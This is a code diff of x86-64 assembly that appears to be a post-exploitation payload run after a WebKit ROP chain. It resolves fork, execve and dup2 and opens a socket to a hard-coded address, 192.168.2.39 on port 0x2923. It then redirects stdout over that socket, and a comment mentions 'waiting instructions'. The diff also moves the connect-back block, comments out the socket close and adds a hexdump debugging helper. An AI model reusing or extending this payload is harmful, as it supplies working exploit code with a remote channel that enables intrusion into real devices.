@@ -135,38 +135,6 @@ resolvefunc fork "[rbp - 0x230]"
 resolvefunc execve "[rbp - 0x238]"
 resolvefunc dup2 "[rbp - 0x240]"
 
-#socket
-    mov     edx, 0          # protocol
-    mov     esi, 2          # type
-    mov     edi, 2          # domain
-    call    [r15 - 0x190] #socket
-
-    mov     [r15 - 0x218], eax
-    cmp     dword ptr [r15 - 0x218], 0
-    js     result_error
-
-#init address struct and connect
-    lea     rdi, [rbp+0x10]
-    mov qword ptr [rdi], 0
-    mov qword ptr [rdi+8], 0
-
-    mov     byte ptr [rbp-15], 2
-    mov     word ptr [rbp-14], 0x2923
-    mov     dword ptr [rbp-12], 0x1f02A8C0
-    lea     rsi, [rbp-0x10]  # addr
-    mov     edx, 0x10        # len
-    mov     edi, [r15 - 0x218] # fd
-    call    [r15 - 0x198] #connect
-    test    eax, eax
-    js     result_error
-
-#dup2 socket to stdout
-    mov rdi, [r15 - 0x218]
-    mov rsi, 1 #STDOUT_FILENO
-    call [rbp - 0x240]
-
-    doprinttext pttextout_got_socket2 "printed\n"
-
     lea rax, qword ptr [rbp - 0x168] #destination
     mov rcx, rax #arg3 
     mov r10, rax #arg3 
@@ -184,7 +152,7 @@ resolvefunc dup2 "[rbp - 0x240]"
 
 resolvefunc printf "[rbp - 0x248]"
 
-    doprinttext pttextout_got_socket3 "printf resolved\n"
+doprinttext pttextout_got_socket3 "printf resolved\n"
 
 call aprintfforu
 .asciz "aprintf for u %X %X %X\n"
@@ -192,21 +160,55 @@ aprintfforu:
 pop rdi
 call [rbp - 0x248]
 
+call aprintfforu2
+.asciz "ABABACABAB\n"
+aprintfforu2:
+pop rdi
+call primitive_hexdump
 
-    lea rsi, [rbp - 0x238]
-    mov edx, 16
+doprinttext pttextout_got_socket4 "hexdump ok\n"
 
+#socket
+    mov     edx, 0          # protocol
+    mov     esi, 2          # type
+    mov     edi, 2          # domain
+    call    [r15 - 0x190] #socket
+
+    mov     [r15 - 0x218], eax
+    cmp     dword ptr [r15 - 0x218], 0
+    js     result_error
+
+#init address struct and connect
+    lea     rdi, [rbp+0x10]
+    mov qword ptr [rdi], 0
+    mov qword ptr [rdi+8], 0
+
+    mov     byte ptr [rbp-15], 2
+    mov     word ptr [rbp-14], 0x2923
+    mov     dword ptr [rbp-12], 0x2702A8C0
+    lea     rsi, [rbp-0x10]  # addr
+    mov     edx, 0x10        # len
     mov     edi, [r15 - 0x218] # fd
-    mov     eax, 0
-    call    [r15 - 0x210] #_write
+    call    [r15 - 0x198] #connect
+    test    eax, eax
+    js     result_error
+
+#dup2 socket to stdout
+    mov rdi, [r15 - 0x218]
+    mov rsi, 1 #STDOUT_FILENO
+    call [rbp - 0x240]
+
+    doprinttext pttextout_got_socket2 "printed\n"
+
+
 
 #dosendtext pttextout3 "[rbp-0x428]" "everything started, waiting instructions\n"
 
 #close socket
-    mov     edi, [r15 - 0x218] # fd
-    mov     eax, 0
-    call    [r15 - 0x200] #_close
-    mov     dword ptr [rbp-0x42C], 0
+    # mov     edi, [r15 - 0x218] # fd
+    # mov     eax, 0
+    # call    [r15 - 0x200] #_close
+    # mov     dword ptr [rbp-0x42C], 0
 
 #call testcall
 #call connect_and_send
@@ -258,6 +260,39 @@ testcall:
     mov rdi, 4 #syscall
     mov rax, 0
     syscall
+    ret
+
+primitive_hexdump:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x30
+
+    mov qword ptr [rbp - 0x20], rdi
+    mov qword ptr [rbp - 0x10], 0
+
+    primitive_hexdump_loop:
+    mov rsi, qword ptr [rbp - 0x20]
+
+    add rsi, qword ptr [rbp - 0x10]
+
+    mov cl, byte ptr [rsi]
+    mov rsi, rcx
+
+    call somestr2
+    .asciz "%02X "
+    somestr2:
+    pop rdi
+
+    call [r15 - 0x248]
+
+    mov rax, qword ptr [rbp - 0x10]
+    inc rax
+    mov qword ptr [rbp - 0x10], rax
+    cmp rax, 0x10
+    jnz primitive_hexdump_loop
+
+    mov rsp, rbp
+    pop rbp
     ret
 
     # this is setup from the rop on webkit
